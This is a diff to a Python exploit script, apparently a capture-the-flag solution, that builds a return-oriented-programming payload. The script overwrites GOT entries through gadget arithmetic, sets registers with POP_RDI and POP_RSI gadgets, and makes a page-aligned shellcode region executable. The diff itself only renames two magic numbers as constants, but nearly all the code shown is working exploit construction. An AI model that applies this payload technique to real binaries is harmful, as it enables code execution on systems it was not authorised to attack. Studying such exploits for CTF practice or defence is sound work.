@@ -4,7 +4,9 @@ import socket
 import struct
 
 RWX = 7
+GADGET_MATH = 0x1ba49f1
 INT_MAX = 0x7fffffff
+PAGE_ALIGN = 0xfffff000
 
 READ_PLT = 0x400d80
 LIBC_START_MAIN_PLT = 0x400d90
@@ -59,7 +61,7 @@ def set_rdx(value):
 
 def deref_add(addr, value):
     payload  = set_rdx(value)
-    payload += set_rax(addr + 0x1ba49f1)
+    payload += set_rax(addr + GADGET_MATH)
     payload += struct.pack('<Q', ADD_DEREF_RAX_EDX)
     payload += 'A' * 8
     return payload
@@ -87,7 +89,7 @@ payload += deref_add(CXA_ATEXIT_GOT, POP_RDX - CXA_ATEXIT)
 payload += deref_add(ERRNO_LOCATION_GOT, MOV_DEREF_RAX_RDX - ERRNO_LOCATION)
 
 payload += struct.pack('<Q', POP_RDI)
-payload += struct.pack('<Q', SHELLCODE_ADDR & 0xfffff000)
+payload += struct.pack('<Q', SHELLCODE_ADDR & PAGE_ALIGN)
 payload += struct.pack('<Q', POP_RSI)
 payload += struct.pack('<Q', 0x1000)
 payload += struct.pack('<Q', CXA_ATEXIT_PLT)
